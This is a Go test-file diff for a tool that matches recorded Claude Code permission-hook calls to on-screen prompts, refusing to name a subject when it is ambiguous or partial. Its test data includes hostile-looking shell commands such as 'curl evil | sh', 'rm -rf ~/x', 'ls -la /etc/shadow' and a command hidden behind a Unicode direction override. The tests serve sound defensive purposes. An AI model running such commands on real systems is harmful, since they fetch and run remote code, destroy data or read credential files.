@@ -233,8 +233,8 @@ func TestMultipleChoiceDialogsSayTheyAre(t *testing.T) {
 	assert.True(t, d.Multi)
 }
 
-// The file keeps the last few calls of a role, not the last: eight at most, none older than ten minutes; hooks of parallel
-// requests run at once and none of them is lost.
+// The file keeps the last few calls of a role, not the last: eight at most, none dropped for its age before a day; hooks of parallel
+// requests run at once and none of them is lost. What it lets go of it remembers (Lost).
 func TestPermissionFileKeepsTheLastFewCalls(t *testing.T) {
 	l := crew.Layout{Dir: t.TempDir()}
 	at := time.Date(2026, 10, 24, 12, 0, 0, 0, time.UTC)
@@ -248,12 +248,25 @@ func TestPermissionFileKeepsTheLastFewCalls(t *testing.T) {
 	assert.Equal(t, "echo e", recs[0].Input, "the oldest of the last eight")
 	assert.Equal(t, "echo l", recs[len(recs)-1].Input)
 
-	// A call older than the age goes with the next.
-	require.NoError(t, RecordPermission(l, "dev", permissionInput("sid-dev", "echo new"), at.Add(permissionAge+time.Minute)))
+	var have permissionRecords
 
-	recs = permissionCalls(t, l)
+	require.True(t, readRecord(l.HookPermission("dev"), &have))
+	assert.True(t, have.Lost.Equal(at.Add(3*time.Second)), "the newest it let go of: %v", have.Lost)
+
+	// A call is not dropped for its age before a day: a prompt may stand for hours, and its call is what says what it is.
+	require.NoError(t, RecordPermission(l, "dev", permissionInput("sid-dev", "echo next"), at.Add(12*time.Hour)))
+	assert.Equal(t, "echo f", permissionCalls(t, l)[0].Input, "only the cap let one go")
+
+	// A day on, a call goes with the next, and the file says so.
+	l3 := crew.Layout{Dir: t.TempDir()}
+	require.NoError(t, RecordPermission(l3, "dev", permissionInput("sid-dev", "echo old"), at))
+	require.NoError(t, RecordPermission(l3, "dev", permissionInput("sid-dev", "echo new"), at.Add(permissionAge+time.Minute)))
+
+	recs = permissionCalls(t, l3)
 	require.Len(t, recs, 1)
 	assert.Equal(t, "echo new", recs[0].Input)
+	require.True(t, readRecord(l3.HookPermission("dev"), &have))
+	assert.True(t, have.Lost.Equal(at))
 
 	// Hooks that run at once lose nothing.
 	l2 := crew.Layout{Dir: t.TempDir()}
@@ -274,8 +287,34 @@ func TestPermissionFileKeepsTheLastFewCalls(t *testing.T) {
 	assert.Len(t, permissionCalls(t, l2), 6)
 }
 
-// Two different calls of one session within the moment a wait began — parallel requests — leave nothing that says which the prompt
-// is: no subject, so nothing is told. The same call twice is one call; a call of the moment and others long before it is the call.
+// A prompt whose call the file may have had to let go of is nobody's: the same call asked nine times in one wait loses its first
+// record to the cap, and what was lost may have been the call of this wait.
+func TestAPromptWhoseRecordWasLetGoIsNotTold(t *testing.T) {
+	f := fixtureWith(t, crewYAML)
+	require.NoError(t, f.s.Up("designer"))
+	f.waitingOn("designer", "permission prompt")
+	f.tm.screen = permissionScreen
+	l := f.s.Crew.Layout()
+
+	for i := range permissionKeep {
+		require.NoError(t, RecordPermission(l, "designer", permissionInput("sid-designer", "rm -rf build"), f.now.Add(time.Duration(i)*100*time.Millisecond)))
+	}
+
+	d := dialogOf(t, f, "designer")
+	require.NotNil(t, d)
+	assert.Equal(t, "rm -rf build", d.Subject, "eight: nothing lost")
+
+	require.NoError(t, RecordPermission(l, "designer", permissionInput("sid-designer", "rm -rf build"), f.now.Add(time.Second)))
+
+	d = dialogOf(t, f, "designer")
+	require.NotNil(t, d)
+	assert.Empty(t, d.Subject, "a ninth: the first, which began the wait, is gone, and nothing says what else was")
+	assert.Equal(t, ParseDialog(permissionScreen).ID, d.ID)
+}
+
+// Two different calls of one session at or after the moment a wait began leave nothing that says which the prompt is: no subject, so
+// nothing is told. The on-screen call is recorded LAST here, so that the screen check alone would pass: only the ambiguity rule stands
+// between this and a wrong subject. The same call twice is one call; a call from before the wait is not in it.
 func TestTwoCallsInTheWindowLeaveNoSubject(t *testing.T) {
 	f := fixtureWith(t, crewYAML)
 	require.NoError(t, f.s.Up("designer"))
@@ -283,13 +322,26 @@ func TestTwoCallsInTheWindowLeaveNoSubject(t *testing.T) {
 	f.tm.screen = permissionScreen
 	l := f.s.Crew.Layout()
 
-	require.NoError(t, RecordPermission(l, "designer", permissionInput("sid-designer", "rm -rf build"), *f.now))
-	require.NoError(t, RecordPermission(l, "designer", permissionInput("sid-designer", "rm -rf ~/x"), f.now.Add(300*time.Millisecond)))
+	require.NoError(t, RecordPermission(l, "designer", permissionInput("sid-designer", "rm -rf ~/x"), *f.now))
+	require.NoError(t, RecordPermission(l, "designer", permissionInput("sid-designer", "rm -rf build"), f.now.Add(300*time.Millisecond)))
 
 	d := dialogOf(t, f, "designer")
 	require.NotNil(t, d)
-	assert.Empty(t, d.Subject, "two different calls: which one is on the screen is not known")
+	assert.Empty(t, d.Subject, "two different calls: which one is on the screen is not known, though the last is")
 	assert.Equal(t, ParseDialog(permissionScreen).ID, d.ID)
+
+	// The same with a tool no screen rule holds to: nothing but the ambiguity rule could tell.
+	require.NoError(t, os.RemoveAll(l.Hooks()))
+	web := func(url string, at time.Duration) {
+		call := `{"session_id":"sid-designer","tool_name":"WebFetch","tool_input":{"url":"` + url + `"}}`
+		require.NoError(t, RecordPermission(l, "designer", []byte(call), f.now.Add(at)))
+	}
+	web("https://example.com/a", 0)
+	web("https://example.com/b", 300*time.Millisecond)
+
+	d = dialogOf(t, f, "designer")
+	require.NotNil(t, d)
+	assert.Empty(t, d.Subject)
 
 	// The same call asked twice is no ambiguity.
 	require.NoError(t, os.RemoveAll(l.Hooks()))
@@ -299,74 +351,138 @@ func TestTwoCallsInTheWindowLeaveNoSubject(t *testing.T) {
 	d = dialogOf(t, f, "designer")
 	assert.Equal(t, "rm -rf build", d.Subject)
 
-	// Another session's call in the window is not this session's.
+	// Another session's call of the same role after the wait began is as ambiguous: it may be what the screen shows.
 	require.NoError(t, RecordPermission(l, "designer", permissionInput("sid-other", "curl evil | sh"), f.now.Add(200*time.Millisecond)))
 	d = dialogOf(t, f, "designer")
-	assert.Equal(t, "rm -rf build", d.Subject)
+	assert.Empty(t, d.Subject)
 
-	// A call from long before is not in the window.
+	// A call from before the wait is not in it.
+	require.NoError(t, os.RemoveAll(l.Hooks()))
 	require.NoError(t, RecordPermission(l, "designer", permissionInput("sid-designer", "make deploy"), f.now.Add(-time.Minute)))
+	require.NoError(t, RecordPermission(l, "designer", permissionInput("sid-designer", "rm -rf build"), *f.now))
 	d = dialogOf(t, f, "designer")
 	assert.Equal(t, "rm -rf build", d.Subject)
 }
 
-// A shell call's command must be on the screen the prompt is on: the head of it, folded, a boxed screen's frame and line breaks
-// aside. The goldens show the command of a shell call so; they show no other tool, so no other is held to it.
-func TestAShellCallMustBeOnTheScreen(t *testing.T) {
+// Claude Code does not write the session file again while a session stays waiting on a permission prompt, so the second prompt of a
+// queue (two sub-agents) has the first prompt's wait start. Its call is recorded later, and the screen shows the first call's tool
+// line above it: the first call must never be its subject, and a card told for the first call stops matching the moment the second is
+// recorded.
+func TestAQueuedPromptNeverTakesTheFirstCallsSubject(t *testing.T) {
 	f := fixtureWith(t, crewYAML)
 	require.NoError(t, f.s.Up("designer"))
 	f.waitingOn("designer", "permission prompt")
 	l := f.s.Crew.Layout()
 
+	// The first prompt, alone: told, with a subject and an id.
+	f.tm.screen = permissionScreenOf("rm -rf build")
 	require.NoError(t, RecordPermission(l, "designer", permissionInput("sid-designer", "rm -rf build"), *f.now))
 
-	f.tm.screen = permissionScreenOf("rm -rf something else entirely")
+	first := dialogOf(t, f, "designer")
+	require.NotNil(t, first)
+	assert.Equal(t, "rm -rf build", first.Subject)
+	assert.True(t, first.SubjectChecked)
+
+	// A second request is recorded while the first prompt is up: the first's id is no more.
+	require.NoError(t, RecordPermission(l, "designer", permissionInput("sid-designer", "git push --force origin main"), f.now.Add(5*time.Second)))
+
+	again := dialogOf(t, f, "designer")
+	require.NotNil(t, again)
+	assert.Empty(t, again.Subject, "two calls since the wait began: nothing says which is on the screen")
+	assert.NotEqual(t, first.ID, again.ID, "a card told before the second call was recorded stops matching")
+
+	// The owner answers the first at the keyboard; the second comes up with the first's tool line above it, the file unchanged.
+	f.tm.screen = "⏺ Bash(rm -rf build)\n  ⎿  (No output)\n\n" + permissionScreenOf("git push --force origin main")
+
+	second := dialogOf(t, f, "designer")
+	require.NotNil(t, second)
+	assert.Empty(t, second.Subject, "the second prompt has no subject: not the first call's, and not certain to be the second's")
+	assert.Equal(t, ParseDialog(f.tm.screen).ID, second.ID)
+
+	// A tool no screen rule holds to, the very same: queued MCP calls.
+	require.NoError(t, os.RemoveAll(l.Hooks()))
+	f.tm.screen = permissionScreen
+
+	call := func(tool string, at time.Duration) {
+		in := `{"session_id":"sid-designer","tool_name":"` + tool + `","tool_input":{"channel":"general","text":"hi all"}}`
+		require.NoError(t, RecordPermission(l, "designer", []byte(in), f.now.Add(at)))
+	}
+	call("mcp__chat__read_channel", 0)
+	call("mcp__chat__send_message", 5*time.Second)
+
 	d := dialogOf(t, f, "designer")
 	require.NotNil(t, d)
-	assert.Empty(t, d.Subject, "the screen asks about another command than the hook recorded")
-	assert.Equal(t, ParseDialog(f.tm.screen).ID, d.ID)
+	assert.Empty(t, d.Subject, "the second call of the queue is on the screen: not the first's, and not told")
+}
 
-	// The golden screen that reads as a dialog prints the command of the call.
+// A shell call's prompt is the block between its title and its question, and the whole of the call (and its description) must be
+// that block, word for word: not the head of it among the last lines, where the tool line of an earlier call stands too.
+func TestAShellCallMustBeThePromptsWholeBlock(t *testing.T) {
+	question := &Dialog{Question: "Do you want to proceed?"}
+	call := func(command, desc string) *AskedPermission {
+		return &AskedPermission{Tool: "Bash", Input: command, Desc: desc}
+	}
+
+	// The golden screens: the whole of the call, described, in a plain screen, a box and a ruled one.
+	for _, name := range []string{"permission-bash", "permission-boxed", "permission-ruled"} {
+		raw, err := os.ReadFile(filepath.Join("testdata", "screens", "claude", name+".txt"))
+		require.NoError(t, err)
+		assert.Equal(t, matchWhole, checkPermissionScreen(call("rm -rf build", "Remove the stale build directory"), string(raw), question), name)
+		assert.Equal(t, matchNone, checkPermissionScreen(call("rm -rf build", ""), string(raw), question), name+": the description is part of what the prompt says")
+		assert.Equal(t, matchNone, checkPermissionScreen(call("rm -rf build", "Something else"), string(raw), question), name)
+	}
+
+	plain := func(command string) string {
+		return strings.Replace(permissionScreen, "rm -rf build\n   clean up", command, 1)
+	}
+
+	// A short command is not the head of a longer one (the review's `ls` on a screen of `rm -rf tools`, and on `ls -la /etc/shadow`).
+	assert.Equal(t, matchNone, checkPermissionScreen(call("ls", ""), plain("rm -rf tools"), question))
+	assert.Equal(t, matchNone, checkPermissionScreen(call("ls", ""), plain("ls -la /etc/shadow"), question))
+	assert.Equal(t, matchNone, checkPermissionScreen(call("rm -rf build", ""), plain("rm -rf build-all"), question))
+	assert.Equal(t, matchWhole, checkPermissionScreen(call("ls", ""), plain("ls"), question))
+
+	// The tool line of an earlier call, above the title, is not the prompt's block.
+	assert.Equal(t, matchNone, checkPermissionScreen(call("rm -rf build", ""), "⏺ Bash(rm -rf build)\n  ⎿  ok\n\n"+plain("git push --force origin main"), question))
+	assert.Equal(t, matchWhole, checkPermissionScreen(call("git push --force origin main", ""), "⏺ Bash(rm -rf build)\n  ⎿  ok\n\n"+plain("git push --force origin main"), question))
+
+	// A frame character in the command is stripped from both sides, not from one.
+	assert.Equal(t, matchWhole, checkPermissionScreen(call("echo '── done ──'", ""), plain("echo '── done ──'"), question))
+	assert.Equal(t, matchWhole, checkPermissionScreen(call("ps │ wc", ""), plain("ps │ wc"), question))
+
+	// Wrapped through a word, or cut: the same words, but not so that they can be compared as they stand: not pressable.
+	assert.Equal(t, matchPartial, checkPermissionScreen(call("git commit -m 'a long message'", ""), plain("git commit -m 'a lo\n   ng message'"), question))
+	assert.Equal(t, matchPartial, checkPermissionScreen(call(clipRunes(strings.Repeat("a", 1200), permissionInputMax), ""),
+		plain(strings.Repeat("a", 1200)), question), "the record was cut: the prompt shows more")
+
+	// No title, no question, another tool.
+	assert.Equal(t, matchNone, checkPermissionScreen(call("rm -rf build", ""), "rm -rf build\nDo you want to proceed?\n❯ 1. Yes", question))
+	assert.Equal(t, matchNone, checkPermissionScreen(call("rm -rf build", ""), permissionScreen, &Dialog{}))
+	assert.Equal(t, matchUnchecked, checkPermissionScreen(&AskedPermission{Tool: "WebFetch", Input: "https://example.com"}, permissionScreen, question))
+
+	// A call of several lines is shown with its breaks, and the prompt draws them as lines.
+	assert.Equal(t, matchWhole, checkPermissionScreen(call("echo ok ⏎ rm -rf ~/x", ""), plain("echo ok\n   rm -rf ~/x"), question))
+}
+
+// A shell call's dialog, from the goldens: the single normal prompt is checked word for word, and not cut.
+func TestASingleShellPromptIsCheckedAndPressable(t *testing.T) {
+	f := fixtureWith(t, crewYAML)
+	require.NoError(t, f.s.Up("designer"))
+	f.waitingOn("designer", "permission prompt")
+
 	raw, err := os.ReadFile(filepath.Join("testdata", "screens", "claude", "permission-bash.txt"))
 	require.NoError(t, err)
 
 	f.tm.screen = string(raw)
-	d = dialogOf(t, f, "designer")
+	call := `{"session_id":"sid-designer","tool_name":"Bash","tool_input":{"command":"rm -rf build","description":"Remove the stale build directory"}}`
+	require.NoError(t, RecordPermission(f.s.Crew.Layout(), "designer", []byte(call), *f.now))
+
+	d := dialogOf(t, f, "designer")
 	require.NotNil(t, d)
+	assert.Equal(t, "Bash", d.Tool)
 	assert.Equal(t, "rm -rf build", d.Subject)
-
-	// The other two goldens are not read as dialogs; were they, a box's frame is not the command's.
-	call := &AskedPermission{Tool: "Bash", Input: "rm -rf build"}
-
-	for _, name := range []string{"permission-bash", "permission-boxed", "permission-ruled"} {
-		raw, err := os.ReadFile(filepath.Join("testdata", "screens", "claude", name+".txt"))
-		require.NoError(t, err)
-		assert.True(t, permissionOnScreen(call, string(raw)), name)
-	}
-
-	assert.False(t, permissionOnScreen(&AskedPermission{Tool: "Bash", Input: "rm -rf ~/x"}, permissionScreen))
-	assert.False(t, permissionOnScreen(&AskedPermission{Tool: "Bash", Input: ""}, permissionScreen), "no words: nothing to be on the screen")
-	assert.True(t, permissionOnScreen(&AskedPermission{Tool: "Write", Input: "/nowhere"}, permissionScreen), "not a shell call: no such rule")
-
-	// A long command wrapped over lines, with the words of a narrow box, is still the command: its head is on the screen.
-	long := "git commit -m 'a long message that a narrow box wraps onto the next line of the prompt' && make deploy"
-	require.NoError(t, os.RemoveAll(l.Hooks()))
-	require.NoError(t, RecordPermission(l, "designer", permissionInput("sid-designer", long), *f.now))
-
-	f.tm.screen = " Bash command\n\n   git commit -m 'a long message\n   that a narrow box wraps onto\n   the next line of the prompt'\n   && make deploy\n\n" +
-		" Do you want to proceed?\n ❯ 1. Yes\n   2. No\n\n Esc to cancel · Tab to amend · ctrl+e to explain"
-	d = dialogOf(t, f, "designer")
-	require.NotNil(t, d)
-	assert.Equal(t, long, d.Subject)
-
-	// Another tool is held only to the ambiguity rule.
-	require.NoError(t, os.RemoveAll(l.Hooks()))
-	require.NoError(t, RecordPermission(l, "designer", []byte(`{"session_id":"sid-designer","tool_name":"WebFetch","tool_input":{"url":"https://example.com/x"}}`), *f.now))
-
-	f.tm.screen = permissionScreen
-	d = dialogOf(t, f, "designer")
-	require.NotNil(t, d)
-	assert.Equal(t, "https://example.com/x", d.Subject)
+	assert.True(t, d.SubjectChecked)
+	assert.False(t, d.SubjectCut)
 }
 
 // A subject that is not all of what is approved says so: cut, or with parts of the call it does not show.
@@ -392,6 +508,17 @@ func TestASubjectThatIsPartialSaysSo(t *testing.T) {
 		"the path is not the content")
 	assert.True(t, record(`{"session_id":"s","tool_name":"Edit","tool_input":{"file_path":"/work/example/a.txt","old_string":"a","new_string":"b"}}`).Cut)
 
+	// Several lines are several things to run: shown with their breaks, and not pressed. So is anything folding changed beyond the space
+	// at its ends (a double space, a control character, a hidden mark).
+	multi := record(`{"session_id":"s","tool_name":"Bash","tool_input":{"command":"echo ok\nrm -rf ~/x"}}`)
+	assert.Equal(t, "echo ok ⏎ rm -rf ~/x", multi.Input)
+	assert.True(t, multi.Cut)
+	assert.True(t, record(`{"session_id":"s","tool_name":"Bash","tool_input":{"command":"echo ok \u202e x; rm -rf ~/x\u001b[2K"}}`).Cut)
+	assert.True(t, record(`{"session_id":"s","tool_name":"Bash","tool_input":{"command":"echo  two spaces"}}`).Cut)
+	assert.False(t, record(`{"session_id":"s","tool_name":"Bash","tool_input":{"command":"  ls  \n"}}`).Cut, "the space at its ends is nothing")
+	assert.Equal(t, "ls", lastPermission(t, l).Input)
+	assert.Equal(t, "list", record(`{"session_id":"s","tool_name":"Bash","tool_input":{"command":"ls","description":"list"}}`).Desc)
+
 	pad := strings.Repeat(" ", 900)
 	assert.True(t, record(`{"session_id":"s","tool_name":"Bash","tool_input":{"command":"`+strings.Repeat("a", 1100)+`"}}`).Cut, "cut at 1000")
 	assert.False(t, record(`{"session_id":"s","tool_name":"Bash","tool_input":{"command":"ls`+pad+`"}}`).Cut, "white space is folded before it is counted")
@@ -400,7 +527,7 @@ func TestASubjectThatIsPartialSaysSo(t *testing.T) {
 	f := fixtureWith(t, crewYAML)
 	require.NoError(t, f.s.Up("designer"))
 	f.waitingOn("designer", "permission prompt")
-	f.tm.screen = permissionScreenOf("rm -rf build")
+	f.tm.screen = strings.Replace(permissionScreen, "rm -rf build\n   clean up", "rm -rf build", 1)
 	require.NoError(t, RecordPermission(f.s.Crew.Layout(), "designer",
 		[]byte(`{"session_id":"sid-designer","tool_name":"Bash","tool_input":{"command":"rm -rf build","dangerouslyDisableSandbox":true}}`), *f.now))
 
@@ -408,4 +535,5 @@ func TestASubjectThatIsPartialSaysSo(t *testing.T) {
 	require.NotNil(t, d)
 	assert.True(t, d.SubjectCut)
 	assert.Equal(t, "rm -rf build", d.Subject)
+	assert.True(t, d.SubjectChecked, "the screen shows all of what the subject says, and there is more to the call")
 }
